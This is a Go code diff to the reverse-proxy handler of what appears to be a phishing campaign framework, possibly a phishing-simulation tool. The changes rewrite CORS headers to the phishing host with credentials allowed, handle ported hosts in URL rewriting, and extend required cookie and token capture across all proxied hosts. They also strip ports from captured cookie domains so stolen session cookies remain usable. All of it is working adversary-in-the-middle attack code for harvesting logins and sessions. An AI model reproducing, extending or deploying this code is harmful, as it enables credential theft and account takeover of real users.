@@ -71,8 +71,8 @@ const (
 )
 
 var (
-	MATCH_URL_REGEXP                = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|test|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
-	MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|test|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+	MATCH_URL_REGEXP                = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|test|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)(?::[0-9]{1,5})?|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+	MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|test|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)(?::[0-9]{1,5})?|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
 )
 
 // VariablesContext holds recipient and campaign data for template variable interpolation
@@ -1065,6 +1065,7 @@ func (m *ProxyHandler) processResponseWithoutSessionContext(resp *http.Response,
 
 	// apply basic response processing
 	m.removeSecurityHeaders(resp)
+	m.rewriteCORSHeaderWithoutSession(resp, config)
 	m.rewriteLocationHeaderWithoutSession(resp, config)
 	m.applyCustomResponseHeaderReplacementsWithoutSession(resp, config, reqCtx.TargetDomain, reqCtx.ProxyConfig)
 	m.rewriteResponseBodyWithoutSessionContext(resp, reqCtx, config)
@@ -1157,6 +1158,25 @@ func (m *ProxyHandler) rewriteLocationHeaderWithoutSession(resp *http.Response, 
 			resp.Header.Set("Location", rURL.String())
 		}
 	}
+}
+
+// rewriteCORSHeaderWithoutSession maps the Access-Control-Allow-Origin host from
+// the target to its phishing equivalent so cross origin requests that carry no
+// proxy session still see an origin that matches the phishing host. A wildcard
+// origin needs no rewrite.
+func (m *ProxyHandler) rewriteCORSHeaderWithoutSession(resp *http.Response, config map[string]service.ProxyServiceDomainConfig) {
+	allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
+	if allowOrigin == "" || allowOrigin == "*" {
+		return
+	}
+
+	if oURL, err := url.Parse(allowOrigin); err == nil {
+		if phishHost := m.replaceHostWithPhished(oURL.Host, config); phishHost != "" {
+			oURL.Host = phishHost
+			resp.Header.Set("Access-Control-Allow-Origin", oURL.String())
+		}
+	}
+	resp.Header.Set("Access-Control-Allow-Credentials", "true")
 }
 
 func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Response, reqCtx *RequestContext, configMap map[string]service.ProxyServiceDomainConfig) {
@@ -1257,9 +1277,19 @@ func (m *ProxyHandler) replaceURLsWithScheme(body []byte, hosts []string, hostMa
 			return sURL
 		}
 
+		urlHost := strings.ToLower(u.Host)
 		for _, h := range hosts {
-			if strings.ToLower(u.Host) == h {
+			if urlHost == h {
 				return strings.Replace(sURL, u.Host, hostMap[h], 1)
+			}
+		}
+		// fall back to the hostname without its port so a portless config host
+		// still matches a url that carries an explicit port
+		if hostname, _, err := net.SplitHostPort(urlHost); err == nil {
+			for _, h := range hosts {
+				if hostname == h {
+					return strings.Replace(sURL, u.Host, hostMap[h], 1)
+				}
 			}
 		}
 		return sURL
@@ -1271,6 +1301,15 @@ func (m *ProxyHandler) replaceURLsWithoutScheme(body []byte, hosts []string, hos
 		for _, h := range hosts {
 			if strings.Contains(sURL, h) && !strings.Contains(sURL, hostMap[h]) {
 				return strings.Replace(sURL, h, hostMap[h], 1)
+			}
+		}
+		// fall back to the hostname without its port so a portless config host
+		// still matches a host that carries an explicit port
+		if hostname, port, err := net.SplitHostPort(strings.ToLower(sURL)); err == nil {
+			for _, h := range hosts {
+				if hostname == h && !strings.Contains(sURL, hostMap[h]) {
+					return strings.Replace(sURL, hostname+":"+port, hostMap[h], 1)
+				}
 			}
 		}
 		return sURL
@@ -1458,17 +1497,20 @@ func (m *ProxyHandler) findSessionByCampaignRecipient(campaignRecipientID *uuid.
 }
 
 func (m *ProxyHandler) initializeRequiredCaptures(session *service.ProxySession) {
-	// only apply capture rules for the current host
-	if hostConfig, ok := session.Config.Load(session.TargetDomain); ok {
-		hCfg := hostConfig.(service.ProxyServiceDomainConfig)
-		if hCfg.Capture != nil {
-			for _, capture := range hCfg.Capture {
-				if capture.Required == nil || *capture.Required {
-					session.RequiredCaptures.Store(capture.Name, false)
-				}
+	// register required captures across every configured host so multi host
+	// flows wait for captures on secondary hosts, not only the start host
+	session.Config.Range(func(_, hostConfigValue interface{}) bool {
+		hCfg, ok := hostConfigValue.(service.ProxyServiceDomainConfig)
+		if !ok {
+			return true
+		}
+		for _, capture := range hCfg.Capture {
+			if capture.Required == nil || *capture.Required {
+				session.RequiredCaptures.Store(capture.Name, false)
 			}
 		}
-	}
+		return true
+	})
 }
 
 func (m *ProxyHandler) onRequestBody(req *http.Request, session *service.ProxySession, proxyConfig *service.ProxyServiceConfigYAML) {
@@ -1703,10 +1745,20 @@ func (m *ProxyHandler) extractCookieData(capture service.ProxyServiceCaptureRule
 	return nil
 }
 
+// stripCookieDomainPort removes a trailing port from a host so it is usable as a
+// cookie domain attribute, which per RFC 6265 must not contain a port. IPv6 hosts
+// without a port are returned unchanged.
+func stripCookieDomainPort(host string) string {
+	if h, _, err := net.SplitHostPort(host); err == nil {
+		return h
+	}
+	return host
+}
+
 func (m *ProxyHandler) buildCookieData(cookie *http.Cookie, resp *http.Response) map[string]string {
 	cookieDomain := cookie.Domain
 	if cookieDomain == "" {
-		cookieDomain = resp.Request.Host
+		cookieDomain = stripCookieDomainPort(resp.Request.Host)
 	}
 
 	isSecure := cookie.Secure
@@ -1967,7 +2019,7 @@ func (m *ProxyHandler) captureFromCookie(req *http.Request, resp *http.Response,
 				domain = req.Host
 			}
 			if domain != "" {
-				capturedData["cookie_domain"] = domain
+				capturedData["cookie_domain"] = stripCookieDomainPort(domain)
 			}
 		}
 	}
@@ -2248,7 +2300,7 @@ func (m *ProxyHandler) formatCapturedData(capturedData map[string]string, captur
 				domain = req.Host
 			}
 			if domain != "" {
-				capturedData["cookie_domain"] = domain
+				capturedData["cookie_domain"] = stripCookieDomainPort(domain)
 			}
 		}
 	case strings.Contains(captureName, "token"):
@@ -2316,27 +2368,40 @@ func (m *ProxyHandler) collectCookieCaptures(session *service.ProxySession) (map
 		requiredCaptureName := requiredCaptureKey.(string)
 		isComplete := requiredCaptureValue.(bool)
 
-		// only apply capture rules for the current host
-		if hostConfig, ok := session.Config.Load(session.TargetDomain); ok {
-			hCfg := hostConfig.(service.ProxyServiceDomainConfig)
-			if hCfg.Capture != nil {
-				for _, capture := range hCfg.Capture {
-					// check for both engine-based and from-based cookie captures
-					isCookieCapture := capture.Engine == "cookie" || capture.From == "cookie"
-					if capture.Name == requiredCaptureName && isCookieCapture {
-						requiredCookieCaptures[requiredCaptureName] = isComplete
-						if capturedDataInterface, exists := session.CapturedData.Load(requiredCaptureName); exists {
-							capturedData := capturedDataInterface.(map[string]string)
-							cookieCaptures[requiredCaptureName] = capturedData
-						}
-					}
-				}
-			}
+		// a required capture may be a cookie capture on any configured host, so
+		// scan every host config rather than only the start host
+		if !m.isCookieCaptureName(session, requiredCaptureName) {
+			return true
+		}
+		requiredCookieCaptures[requiredCaptureName] = isComplete
+		if capturedDataInterface, exists := session.CapturedData.Load(requiredCaptureName); exists {
+			capturedData := capturedDataInterface.(map[string]string)
+			cookieCaptures[requiredCaptureName] = capturedData
 		}
 		return true
 	})
 
 	return cookieCaptures, requiredCookieCaptures
+}
+
+// isCookieCaptureName reports whether the named required capture is a cookie
+// capture on any host in the session config.
+func (m *ProxyHandler) isCookieCaptureName(session *service.ProxySession, name string) bool {
+	found := false
+	session.Config.Range(func(_, hostConfigValue interface{}) bool {
+		hCfg, ok := hostConfigValue.(service.ProxyServiceDomainConfig)
+		if !ok {
+			return true
+		}
+		for _, capture := range hCfg.Capture {
+			if capture.Name == name && (capture.Engine == "cookie" || capture.From == "cookie") {
+				found = true
+				return false
+			}
+		}
+		return true
+	})
+	return found
 }
 
 func (m *ProxyHandler) areAllCookieCapturesComplete(requiredCookieCaptures map[string]bool) bool {
